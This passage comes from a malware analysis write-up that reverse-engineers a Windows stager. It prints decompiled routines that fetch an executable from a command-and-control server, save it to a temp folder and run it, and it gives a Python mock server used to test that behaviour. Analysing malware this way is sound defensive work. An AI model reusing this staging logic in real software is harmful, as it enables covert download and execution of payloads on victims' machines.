  TempPathA = 0;
  NumberOfBytesWritten = 0;
  PrefixString = 0;
  hFile = (HANDLE)-1;
  if ( !filePath )
    return 87;
  ProcessHeap = GetProcessHeap();
  *filePath = (LPSTR)HeapAlloc(ProcessHeap, 8u, 0x105u);
  if ( !*filePath )
    return 1450;
  TempPathA = GetTempPathA(0x105u, *filePath);
  if ( TempPathA
    && (TempPathA = GetTempFileNameA(*filePath, &PrefixString, 0, *filePath)) != 0
    && (hFile = CreateFileA(*filePath, 0x40000000u, 1u, 0, 2u, 0, 0), hFile != (HANDLE)-1)
    && WriteFile(hFile, serverResponse, responseSize, &NumberOfBytesWritten, 0)
    && NumberOfBytesWritten == responseSize )
  {
    CloseHandle(hFile);
    return 0;
  }
  else
  {
    if ( hFile != (HANDLE)-1 )
      CloseHandle(hFile);
    HeapFreeFn(*filePath);
    *filePath = 0;
    return 123;
  }
}
```
This function simply creates a temp path and stores it in `a1`. Then, it creates a file by reading the server response bytes that, as we found out previously, contains bytes of a valid PE.

We can thus rename the function to `CreateFolderAndSaveServerPE`.
If we further analyze **Code 27**, there's a call to `sub_401A70`, which is:
```cpp
int __cdecl sub_401A70(LPCSTR serverPeFolderPath, LPDWORD lpExitCode, DWORD dwMilliseconds)
{
  HANDLE ProcessHeap; // eax
  HANDLE v5; // eax
  int v6; // [esp+0h] [ebp-74h]
  LPVOID lpMem; // [esp+4h] [ebp-70h]
  HMODULE hModule; // [esp+8h] [ebp-6Ch]
  HANDLE hHandle[24]; // [esp+Ch] [ebp-68h] BYREF
  size_t Size; // [esp+6Ch] [ebp-8h]
  UINT uTimerID; // [esp+70h] [ebp-4h]

  memset(hHandle, 0, 92);
  uTimerID = 0;
  Size = 0;
  v6 = -2147467259;
  if ( timeSetEvent && timeKillEvent )
    goto LABEL_8;
  hModule = LoadLibraryA("WINMM.dll");
  if ( !hModule )
    return -2147467259;
  timeSetEvent = (MMRESULT (__stdcall *)(UINT, UINT, LPTIMECALLBACK, DWORD_PTR, UINT))GetProcAddress(
                                                                                        hModule,
                                                                                        "timeSetEvent");
  timeKillEvent = (MMRESULT (__stdcall *)(UINT))GetProcAddress(hModule, "timeKillEvent");
  if ( !timeSetEvent || !timeKillEvent )
    return -2147467259;
LABEL_8:
  if ( !serverPeFolderPath )
    return -2147024809;
  Size = lstrlenA(serverPeFolderPath) + 1;
  if ( Size > 0x104 )
    return -2147024809;
  ProcessHeap = GetProcessHeap();
  lpMem = HeapAlloc(ProcessHeap, 8u, 0x104u);
  if ( !lpMem )
    return -2147467259;
  memmove(lpMem, serverPeFolderPath, Size);
  hHandle[0] = CreateEventA(0, 1, 0, 0);
  if ( hHandle[0] )
  {
    hHandle[1] = lpMem;
    hHandle[2] = (HANDLE)68;
    uTimerID = timeSetEvent(0x7D0u, 0x64u, execPeAndSignalExecStart, (DWORD_PTR)hHandle, 0);
    if ( uTimerID )
    {
      if ( WaitForSingleObject(hHandle[0], 0x1D4C0u) )
        execPeAndSignalExecStart(0, 0, (DWORD_PTR)hHandle, 0, 0);
      timeKillEvent(uTimerID);
      if ( !lpExitCode
        || (WaitForSingleObject(hHandle[19], dwMilliseconds), GetExitCodeProcess(hHandle[19], lpExitCode)) )
      {
        v6 = 0;
      }
    }
  }
  if ( hHandle[0] )
    CloseHandle(hHandle[0]);
  if ( hHandle[20] )
    CloseHandle(hHandle[20]);
  if ( hHandle[19] )
    CloseHandle(hHandle[19]);
  v5 = GetProcessHeap();
  HeapFree(v5, 0, lpMem);
  return v6;
}
```
If we look at the docs for `timeSetEvent` and `timeKillEvent`, we know that this function attempts to execute the stored PE (retrieved from the C2 server) after a delay of 2000 ms (2s).
Specifically the function simply waits `0x1D4C0u` ms (120000ms, or 120s) for the callback `execPeAndSignalExecStart` to be executed; if that doesn't happen then it tries to execute it with a direct call.

We now have a complete idea of what **Code 21.5** does. Here's how it can be rewritten:
```cpp
void __noreturn sub_401570()
{
  LPVOID peFolderPath; // [esp+4h] [ebp-10h] BYREF
  DWORD nNumberOfBytesToWrite; // [esp+8h] [ebp-Ch] BYREF
  LPCVOID serverResponse; // [esp+Ch] [ebp-8h] BYREF
  HANDLE hObject; // [esp+10h] [ebp-4h]

  serverResponse = 0;
  nNumberOfBytesToWrite = 0;
  peFolderPath = 0;
  CreateMutex();
  hObject = CreateThread(0, 0, StartAddress, 0, 0, 0);
  CreateNamedEventAndSetLowIntegrity(InitialPollingStarted);// signal other threads that initial polling started
  while ( 1 )
  {
    while ( GenIdAndStartC2Communication((LPVOID *)&serverResponse, &nNumberOfBytesToWrite, 0) < 0
         || !nNumberOfBytesToWrite )
    {                                           // send  process/installed programs info to C2 + wait correct response
      serverResponse = 0;
      Sleep(15000u);
    }
    CreateNamedEventAndSetLowIntegrity(C2ResponseReceived);// signal other threads that C2 response received
    if ( !decryptServerResponse((int)serverResponse, nNumberOfBytesToWrite)
      && *(_WORD *)serverResponse == 0x5A4D     // Check if valid MZ signature in DOS
      && *(_WORD *)((char *)serverResponse + *((_DWORD *)serverResponse + 15)) == 0x4550 )
    {                                           // Check if valid "PE" signature 
      break;                                    // if C2 send valid PE, break from loop
    }
    VirtualFreeFn((LPVOID)serverResponse);
    serverResponse = 0;
  }
  CreateNamedEventAndSetLowIntegrity(ServerResponseValidPE);// signal other threads that C2 send valid PE
  if ( !CreateFolderAndSaveServerPE((LPSTR *)&peFolderPath, serverResponse, nNumberOfBytesToWrite) )
  {
    CreateNamedEventAndSetLowIntegrity(PeFileSaved);// signal other threads that the PE file (and folder) provided by the C2 was saved
    executeC2PeFile((LPCSTR)peFolderPath, 0, 0);
    CreateNamedEventAndSetLowIntegrity(PeFileExecuted);
  }
  if ( peFolderPath )
    HeapFreeFn(peFolderPath);                   // Delete temp PE file folder
  if ( hObject )
    CloseHandle(hObject);
  VirtualFreeFn((LPVOID)serverResponse);
  ExitThread(0);
}
```
The function:
- Contacts the C2 server as explained before,
- Retrieves a response from the C2 server
- Checks if the response is a valid PE file,
- If the response is a valid PE file a temporary folder is created and a new file is created by using the data given by the C2 response,
- This file is finally executed,
- The temporary folder is deleted.

This seems to confirm my previous assumption that the payload is actually a **stager**.


Since the C2 server used by the malware's payload is off, let's simulate one of its responses through a custom C2 server made in python:
```python
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse, os, sys, traceback

PAYLOAD_PATH = r"C:\Windows\system32\cmd.exe" 
LISTEN_HOST = "0.0.0.0"
PORT = 80
EXPECTED_PREFIX = "/searcho"

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            self._handle_request()
        except Exception:
            print("ex in do_POST:", file=sys.stderr)
            traceback.print_exc()
            self.send_response(500)
            self.end_headers()

    def do_GET(self):
        try:
            self._handle_request()
        except Exception:
            print("EXCEPTION in do_GET:", file=sys.stderr)
            traceback.print_exc()
            self.send_response(500)
            self.end_headers()

    def _handle_request(self):
        parsed = urllib.parse.urlparse(self.path)
        print("Request:", self.command, self.path, "From:", self.client_address)
        if not parsed.path.startswith(EXPECTED_PREFIX):
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")
            return

        if not os.path.exists(PAYLOAD_PATH):
            print("Payload not found at", PAYLOAD_PATH, file=sys.stderr)
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"Payload missing\n")
            return


        content_length = int(self.headers.get("Content-Length", "0"))
        if content_length:
            body = self.rfile.read(content_length)
            print("Received POST body length:", len(body))
        else:
            body = b""
            print("No POST body")

        try:
            with open(PAYLOAD_PATH, "rb") as f:
                data = f.read()
        except Exception:
            print("error while opening payload:", file=sys.stderr)
            traceback.print_exc()
            self.send_response(500)
            self.end_headers()
            return

        self.send_response(200)
        self.send_header("Content-Type", "application/x-www-form-urlencoded")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)
        print("Served payload, bytes:", len(data))

    def log_message(self, format, *args):
        pass

if __name__ == "__main__":
    print("Serving payload from", PAYLOAD_PATH, "on port", PORT)
    httpd = HTTPServer((LISTEN_HOST, PORT), Handler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("Stopping server")
        httpd.server_close()
```

This does what the malware expects: listens to the correct server URL (which is redirected to localhost through the Windows `host` file) => serves a random PE file (in this example, `cmd.exe`) when requested.
Note that this custom server doesn't encrypt the payload that will be served to the malware; instead, we will run the malware in a debugger and prevent any decryption from happening.

With all of that being done, we notice that the malware stores a temporary .tmp file inside a temporary folder (in my case `C:\Users\admin\AppData\Local\Temp\F9F5.tmp`.

The copied file has identical size of `cmd.exe` and if we compare its bytes to it in HxD they're identical.
Finally, the malware executes (in this case) `cmd.exe`, deletes the temporary folder and the copied file, and completes execution.


# Conclusions
The analyzed turns out to be a stager (https://encyclopedia.kaspersky.com/glossary/stager/).
Specifically this is what it does:
1) The main executable takes an encrypted embedded payload and decrypts it.
2) The main executable loads this payload at runtime, in different ways depending if the malware's process is a DLL or an EXE. But the end result is the same, the payload is executed.
3) The payload:
   3.1) Generates an UserID
   3.2) Scans all active processes and retrieves their executable names, which are stored in a buffer
   3.3) Scans all installed programs and copies their details in the same buffer
   3.4) Sends the buffer with all this information to the C2 server, providing the generated UserID
   3.5) Waits for a response from the C2 server, and validates that the response is a valid PE file
   3.6) Creates a temporary folder, creates a new file in it, and copies the PE bytes provided by the C2 server.
   3.7) Executes the downloaded PE file (Which will be a malicious payload), deletes the temporary folder and exits.

The final assumption is that the UserID is used to keep track of each infection stage for each infected user. 
This way, the attacker can send specific malware to specific users too.
